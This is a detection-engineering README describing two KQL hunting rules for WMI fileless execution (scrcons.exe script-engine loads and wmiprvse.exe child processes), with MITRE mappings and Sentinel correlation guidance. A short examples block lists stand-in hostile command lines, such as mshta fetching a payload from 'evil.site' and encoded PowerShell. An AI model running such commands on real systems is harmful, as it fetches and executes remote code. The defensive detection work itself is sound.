# WMI Fileless Execution Ecosystem (Composite L2)

This folder contains a **cousin-based detection ecosystem** for one of the most important modern fileless persistence/execution surfaces in Windows:

> **WMI Permanent Event Subscriptions → Script Consumer Execution → Secondary Payload Launch**

These hunts are built using the **Minimum Truth + Reinforcement** doctrine:

- **Truth anchors** detect the substrate behaviour that must exist
- **Reinforcement cousins** confirm execution, payload intent, and escalation conditions
- No monolithic kill-chain logic
- Clean operational output for Microsoft Defender XDR / Sentinel

---

## Ecosystem Overview

WMI fileless attacks are powerful because they allow attackers to execute payloads **without dropping obvious binaries**.

The chain often looks like:

```text
WMI Subscription → scrcons.exe Consumer → Script Engine Load
                           ↓
                    wmiprvse.exe launches payload
                           ↓
                 PowerShell / cmd / rundll32 + network
```

This ecosystem detects both sides:

| Rule | Role | Ecosystem Function |
|------|------|-------------------|
| **Scrcons Substrate Rule** | Anchor | Detects the fileless script execution substrate |
| **WmiPrvSE Victim Rule** | Cousin | Detects secondary payload execution spawned by WMI |

Together they form a **Composite Cousin Pair**.

---

## Rule 1 — Scrcons Substrate Anchor

### File
- `WMI-A2B_L2_Fileless_Consumer_Execution_Scrcons_Substrate.kql`

### Attacker Intent
Attackers abuse WMI permanent event consumers that execute through:

```text
scrcons.exe
```

To run fileless payloads using script engines:

```text
vbscript.dll
jscript.dll
scrobj.dll
```

### Minimum Truth

This rule anchors on the non-negotiable substrate:

```text
scrcons.exe loads a script engine DLL
```

This is extremely rare in normal enterprise environments.

### Reinforcement Signals (Optional)

- Near-time network activity (±1 minute)
- Non-system DLL load paths
- Host-level rarity / prevalence scoring

### MITRE Mapping

- **T1546.003** — Event Triggered Execution: WMI Subscription  
- **T1047** — Windows Management Instrumentation  
- **TA0002 / TA0005** — Execution + Defense Evasion  

---

## Rule 2 — WmiPrvSE Secondary Execution Victim

### File
- `WMI-A3_L2_WmiPrvSE_Secondary_Execution_Victim.kql`

### Attacker Intent

Once WMI execution is triggered, attackers commonly pivot into:

```text
wmiprvse.exe spawning payload processes
```

Typical payload children include:

```text
powershell.exe
cmd.exe
mshta.exe
rundll32.exe
wscript.exe
cscript.exe
```

This represents the **execution victim stage** of the WMI chain.

### Malicious Commandline Examples

```text
powershell.exe -enc <base64>
cmd.exe /c whoami && curl http://x
rundll32.exe javascript:...
mshta.exe https://evil.site/payload
```

### Reinforcement Logic

This cousin escalates severity when combined with:

- Payload execution hints (`-enc`, URLs, UNC paths)
- Immediate outbound network behaviour

### MITRE Mapping

- **T1047** — WMI Execution  
- **T1059** — Command and Scripting Interpreter  
- **TA0002** — Execution  

---

## Cousin-Based Confirmation Model

These rules are not standalone alerts.

They are designed as **capability cousins**:

```text
Scrcons Substrate Truth
        +
WmiPrvSE Payload Execution Truth
        =
Fileless WMI Execution Confirmed (High Confidence)
```

This is exactly how your framework avoids noise:

- One detection = suspicious
- Multiple cousins = confirmed attacker capability

---

## Stress Testing & Validation

These composites were validated using:

- ADX-Docker synthetic telemetry harness
- Empire-style WMI execution simulations
- Fileless consumer execution patterns

The goal is not “perfect coverage.”

The goal is:

> **High-fidelity minimum truth detection that survives real telemetry noise**

---

## Operational Deployment Guidance

Recommended Sentinel usage:

- Run both rules as scheduled analytics
- Output into a unified composite stream
- Correlate using cousin confirmation logic:

```text
If Scrcons fires AND WmiPrvSE fires within 6h → Escalate Incident
```

This avoids monolithic kill-chain rules while enabling strong escalation.

---

## Why This Ecosystem Matters

WMI fileless execution is:

- stealthy
- persistent
- widely used in real intrusions
- frequently missed by static IOC detections

This cousin ecosystem provides:

- substrate truth
- execution truth
- reinforcement escalation
- SOC-ready directives

---

## Author

**Ala Dabat**  
Composite Threat Hunting Framework  
Minimum Truth Detection Engineering (2026)

---
